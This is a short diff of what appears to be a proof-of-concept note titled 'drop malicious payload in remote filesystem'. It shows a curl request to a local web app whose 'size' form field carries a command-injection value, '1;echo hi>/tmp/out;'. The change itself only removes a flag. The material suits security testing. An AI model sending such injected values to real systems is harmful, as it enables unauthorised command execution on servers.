@@ -24,5 +24,4 @@ drop malicious payload in remote filesystem
 curl 'http://localhost:5000/home' \
    -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQJEtZoqQ8I4ZmYVs' \
   --data-raw $'------WebKitFormBoundaryQJEtZoqQ8I4ZmYVs\r\nContent-Disposition: form-data; name="size"\r\n\r\n1;echo hi>/tmp/out;\r\n------WebKitFormBoundaryQJEtZoqQ8I4ZmYVs--\r\n' \
-  --compressed
 ```
